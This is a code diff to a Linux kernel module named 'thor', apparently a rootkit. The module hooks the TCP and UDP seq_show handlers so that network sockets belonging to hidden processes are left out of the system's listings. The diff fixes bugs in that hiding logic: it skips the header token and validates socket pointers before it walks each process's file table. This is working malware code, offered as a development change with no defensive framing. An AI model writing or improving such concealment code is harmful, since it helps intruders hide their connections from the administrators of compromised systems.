@@ -5,6 +5,7 @@
 #include <linux/fdtable.h>
 #include <linux/kallsyms.h>
 #include <linux/net.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/socket.h>
 #include <linux/version.h>
@@ -124,7 +125,7 @@ static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
     int ret;
 
     /* hide port */
-    if (is_socket_process_hidden(v))
+    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
     /*
@@ -144,7 +145,7 @@ static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
     int ret;
 
     /* hide port */
-    if (is_socket_process_hidden(v))
+    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
     /*
@@ -164,7 +165,7 @@ static int thor_udp4_seq_show(struct seq_file *seq, void *v)
     int ret;
 
     /* hide port */
-    if (is_socket_process_hidden(v))
+    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
     /*
@@ -184,7 +185,7 @@ static int thor_udp6_seq_show(struct seq_file *seq, void *v)
     int ret;
 
     /* hide port */
-    if (is_socket_process_hidden(v))
+    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
         return 0;
 
     /*
@@ -204,6 +205,10 @@ static bool is_socket_process_hidden(struct sock *sp)
 {
     struct task_struct *task;
 
+    /* check sp */
+    if (!sp || !sp->sk_socket || !sp->sk_socket->file)
+        return false;
+
     for_each_process(task) {
         int n = 0;
         struct fdtable *fdt;
@@ -222,33 +227,14 @@ static bool is_socket_process_hidden(struct sock *sp)
         if (!files)
             continue;
 
-        LOG_INFO("checking sockets of process %d", task->pid);
-
         /* go through file descriptor table */
         spin_lock(&files->file_lock);
         for (fdt = files_fdtable(files); n < fdt->max_fds; n++) {
             if (!fdt->fd[n])
                 continue;
 
-            /* no idea why sp is sometimes 0x1 */
-            if (sp == NULL || sp == (void *) 0x1) {
-                LOG_INFO("invalid sock reference");
-                continue;
-            }
-
-            if (!sp->sk_socket) {
-                LOG_INFO("invalid socket reference");
-                continue;
-            }
-
-            if (!sp->sk_socket->file) {
-                LOG_INFO("invalid file reference");
-                continue;
-            }
-
             if (sp->sk_socket->file->f_inode == fdt->fd[n]->f_inode) {
-                /* found! --> hide it */
-                LOG_INFO("found socket");
+                LOG_INFO("found socket --> hide it");
                 spin_unlock(&files->file_lock);
                 return true;
             }
